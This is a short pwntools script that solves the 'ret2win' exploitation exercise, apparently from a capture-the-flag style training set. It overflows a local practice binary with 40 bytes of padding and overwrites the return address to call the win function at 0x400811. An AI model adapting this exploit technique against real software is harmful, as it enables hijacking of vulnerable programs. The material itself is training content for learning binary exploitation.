from pwn import *

# ret2win() address can be found by calling nm ret2win | grep ' t '
ret2win = 0x400811

# RIP offset is at 40
rop = "A" * 40

# Call ret2win()
rop += p64(ret2win)

# Start process and send rop chain
e = process('ret2win')
print e.recv()
e.sendline(rop)

# Print output of ret2win()
print e.recvall()
